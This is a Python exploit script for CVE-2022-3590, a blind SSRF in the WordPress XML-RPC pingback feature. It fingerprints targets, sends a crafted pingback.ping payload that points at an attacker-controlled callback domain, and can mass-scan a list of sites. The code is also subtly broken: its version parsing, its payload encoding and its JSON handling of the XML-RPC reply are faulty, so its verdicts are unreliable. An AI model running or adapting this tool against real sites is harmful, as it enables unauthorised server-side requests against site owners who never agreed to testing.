import argparse
import re
import requests
import urllib.parse
from packaging import version
from typing import Optional

BANNER = """
   ___  __   __  ___         ___    __    ___   ___         ____  ___   ___    __
  / __| \ \ / / | __|  ___  |_  )  /  \  |_  ) |_  )  ___  |__ / | __| / _ \  /  \\
 | (__   \ V /  | _|  |___|  / /  | () |  / /   / /  |___|  |_ \ |__ \ \_, / | () |
  \___|   \_/   |___|       /___|  \__/  /___| /___|       |___/ |___/  /_/   \__/

           ----------------------------------------------
           | Author:   | @hxlxmj                        |
           | Github:   | https://github.com/hxlxmjxbbxs |
           | Released: | 06/12/2023                     |
           ----------------------------------------------
"""

DEFAULT_DOMAIN = "REPLACE_THIS_WITH_YOUR_OWN_INTERACTSH_DOMAIN" # Visit this link https://app.interactsh.com/ copy the generated host and paste it in here
PAYLOAD_TEMPLATE = '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>{pingback_url}</string></value></param><param><value><string>http://{domain}/</string></value></param></params></methodCall>'


def banner():
    print(BANNER)


def get_request(session, url, error_msg):
    try:
        return session.get(url)
    except requests.exceptions.RequestException as e:
        handle_request_exception(e, error_msg)
        return None


def get_wordpress_version(session, url):
    response = get_request(session, url, "getting WordPress version")
    if response:
        version_match = re.search('content="WordPress ([^\s]+)', response.text)
        if version_match:
            version_string = re.sub(r"\D", "", version_match.group(1))
            return version.parse(version_string)
    return None


def is_pingback_enabled(session, url):
    response = get_request(session, url + "/xmlrpc.php?rsd", "checking pingback feature")
    return response is not None and (
        f'<api name="pingback" blogID="1" preferred="false" apiLink="{url}/xmlrpc.php?pingback" />'
        in response.text
    )


def print_info(message, is_vulnerable=False):
    if is_vulnerable:
        print(f"\033[92m[-] {message}\033[0m")
    else:
        print(f"[-] {message}")


def print_error(message):
    print(f"\033[91m[-] {message}\033[0m")


def handle_request_exception(exception, operation):
    error_message = str(exception)
    if "Failed to establish a new connection" in error_message:
        error_message = "Failed to establish a new connection (Connection Issue)"
    print_error(f"An error occurred while {operation}: {error_message}\n")


def check_cve_2022_3590(session, url, domain=None):
    wp_version = get_wordpress_version(session, url)
    if wp_version and wp_version > version.parse("6.2"):
        print_info(f"{url} is not vulnerable (WordPress version > 6.2).\n")
        return

    if not is_pingback_enabled(session, url):
        print_info(f"{url} is not vulnerable (Pingback feature is disabled).\n")
        return

    target_url = url + "/xmlrpc.php"
    if not domain:
        domain = DEFAULT_DOMAIN
    pingback_url = "http://127.0.0.1/"
    payload = PAYLOAD_TEMPLATE.format(pingback_url=pingback_url, domain=domain)
    encoded_payload = urllib.parse.quote(payload)

    try:
        response = session.post(target_url, data=encoded_payload)
        response.raise_for_status()
        data = response.json()
    except requests.exceptions.HTTPError as e:
        print_info(f"HTTP error occurred: {e}\n")
        return
    except requests.exceptions.RequestException as e:
        handle_request_exception(e, "")
        return
    except ValueError:  # includes simplejson.errors.JSONDecodeError
        data = None

    if data and "faultCode" in data and data["faultCode"] == 0:
        print_info(f"{url} is vulnerable!", is_vulnerable=True)
    else:
        print_info(f"{url} is not vulnerable.\n")


def main():
    banner()
    parser = argparse.ArgumentParser(
        description="Check if a given WordPress website is vulnerable to the CVE-2022-3590 vulnerability by exploiting the blind SSRF in the pingback feature."
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="The URL of the WordPress website to check")
    group.add_argument(
        "-f",
        "--file",
        help="A file containing a list of URLs of WordPress websites to check",
    )
    parser.add_argument("-d", "--domain", help="The domain controlled by the attacker")
    parser.add_argument(
        "--attacker-domain", help="The domain controlled by the attacker (DEFAULT_DOMAIN)"
    )
    args = parser.parse_args()

    if args.attacker_domain:
        DEFAULT_DOMAIN = args.attacker_domain

    with requests.Session() as session:
        if args.file:
            with open(args.file, "r") as file:
                urls = [url.strip() for url in file.readlines()]
            for url in urls:
                check_cve_2022_3590(session, url, args.domain)
        else:
            check_cve_2022_3590(session, args.url, args.domain)


if __name__ == "__main__":
    main()